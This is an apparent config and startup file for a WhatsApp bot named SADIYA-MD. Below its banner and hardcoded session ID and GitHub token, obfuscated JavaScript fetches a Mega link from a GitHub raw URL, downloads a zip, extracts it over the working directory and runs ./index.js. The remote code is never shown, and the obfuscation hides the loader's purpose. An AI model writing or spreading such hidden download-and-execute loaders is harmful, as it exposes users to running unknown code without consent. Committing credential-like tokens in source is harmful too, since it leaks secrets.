/**
══════════════════════════════════════════════════════════════════════════════════════════════════════

░██████╗░█████╗░██████╗░██╗██╗░░░██╗░█████╗░░░░░░███╗░░░███╗██████╗░ 
██╔════╝██╔══██╗██╔══██╗██║╚██╗░██╔╝██╔══██╗░░░░░████╗░████║██╔══██╗ 
╚█████╗░███████║██║░░██║██║░╚████╔╝░███████║░░░░░██╔████╔██║██║░░██║ 
░╚═══██╗██╔══██║██║░░██║██║░░╚██╔╝░░██╔══██║░░░░░██║╚██╔╝██║██║░░██║ 
██████╔╝██║░░██║██████╔╝██║░░░██║░░░██║░░██║░░░░░██║░╚═╝░██║██████╔╝ 
╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝░░░░░╚═╝╚═════╝░ 

══════════════════════════════════════════════════════════════════════════════════════════════════════
*
   * @project_name : SADIYA-MD
   * @creator : Sadiya Tech
   * @youtube : https://www.youtube.com/@Sadiya-Tech
   * @description : SADIYA-MD ,Javascript WhatsApp Bot Made By Sadiya Tech.
*
* 
   * Created By Sadiya Tech.
   * © 2025 SADIYA-MD .
*/

const SESSION_ID = "975120"
const GITHUB_USER_NAME = "abdossamad"
const GITHUB_AUTH_TOKEN = "SADIYA-MD=3wASxCZB#MRY-f1tvQYXthLL6z4A2IoxpPAUo8F4lZbOkptZ0Llg"
const DATABASE_REPO_NAME = "SADIYA-MD-DATABASE"

const _0x5337a2=_0x8797;function _0x4035(){const _0x2d47ac=['4631590fntgHQ','5424123KXYhKH','./index.js','4428137HStUfo','831672hQJSsk','8TdcRBv','2172816OtnXoZ','/plugins','4661700hDEEGw','/config.js','An\x20error\x20occurred:','6bQQypo','log','downloadBuffer','fromURL','mega_zip','extractAllTo','unlinkSync','data','exports','https://raw.githubusercontent.com/tech14555/db','message','temp.zip','error','30261987bwHpnS','/lib','/index.js','Main\x20downloaded\x20successfully\x20✅'];_0x4035=function(){return _0x2d47ac;};return _0x4035();}(function(_0x3f3dc5,_0x5b95a8){const _0x5f1fa5=_0x8797,_0x59ad9f=_0x3f3dc5();while(!![]){try{const _0x597412=parseInt(_0x5f1fa5(0x1d8))/0x1+-parseInt(_0x5f1fa5(0x1da))/0x2+parseInt(_0x5f1fa5(0x1d5))/0x3+parseInt(_0x5f1fa5(0x1dc))/0x4+parseInt(_0x5f1fa5(0x1d4))/0x5*(parseInt(_0x5f1fa5(0x1df))/0x6)+parseInt(_0x5f1fa5(0x1d7))/0x7+-parseInt(_0x5f1fa5(0x1d9))/0x8*(parseInt(_0x5f1fa5(0x1d0))/0x9);if(_0x597412===_0x5b95a8)break;else _0x59ad9f['push'](_0x59ad9f['shift']());}catch(_0x2fea1d){_0x59ad9f['push'](_0x59ad9f['shift']());}}}(_0x4035,0xdf6fc),module[_0x5337a2(0x1e7)]={'SESSION_ID':SESSION_ID,'GITHUB_USER_NAME':GITHUB_USER_NAME,'GITHUB_AUTH_TOKEN':GITHUB_AUTH_TOKEN,'DATABASE_REPO_NAME':DATABASE_REPO_NAME});const fs=require('fs'),path=require('path'),{File}=require('megajs'),AdmZip=require('adm-zip'),axios=require('axios'),db_repo=_0x5337a2(0x1cc),ZIP_DIR='./';async function downloadAndExtractZip(){const _0x30a2bc=_0x5337a2;try{const _0x34136a=await axios['get'](db_repo+'/refs/heads/main/mega_zip.json'),_0x33f6fe=_0x34136a[_0x30a2bc(0x1e6)][_0x30a2bc(0x1e3)],_0x1eef82=File[_0x30a2bc(0x1e2)](_0x33f6fe),_0x4faaa8=await _0x1eef82[_0x30a2bc(0x1e1)](),_0x1b0ab4=path['join'](__dirname,_0x30a2bc(0x1ce));fs['writeFileSync'](_0x1b0ab4,_0x4faaa8);const _0x9ccfe5=new AdmZip(_0x1b0ab4);_0x9ccfe5[_0x30a2bc(0x1e4)](ZIP_DIR,!![]),fs[_0x30a2bc(0x1e5)](_0x1b0ab4),console[_0x30a2bc(0x1e0)](_0x30a2bc(0x1d3));}catch(_0x212165){console[_0x30a2bc(0x1cf)]('❌\x20Error\x20during\x20download\x20and\x20extraction:',_0x212165[_0x30a2bc(0x1cd)]),process['exit'](0x1);}}const main=async()=>{const _0x1672c3=_0x5337a2;try{!fs['existsSync'](__dirname+_0x1672c3(0x1d1)||_0x1672c3(0x1db)||_0x1672c3(0x1d2)||_0x1672c3(0x1dd))?await downloadAndExtractZip():console[_0x1672c3(0x1e0)]('⏩\x20Skip\x20download\x20main\x20file'),require(_0x1672c3(0x1d6));}catch(_0x4a5d0c){console[_0x1672c3(0x1cf)](_0x1672c3(0x1de),_0x4a5d0c[_0x1672c3(0x1cd)]);}};function _0x8797(_0x341121,_0x1045fd){const _0x4035e5=_0x4035();return _0x8797=function(_0x87974c,_0x4f9230){_0x87974c=_0x87974c-0x1cc;let _0x26888a=_0x4035e5[_0x87974c];return _0x26888a;},_0x8797(_0x341121,_0x1045fd);}main();
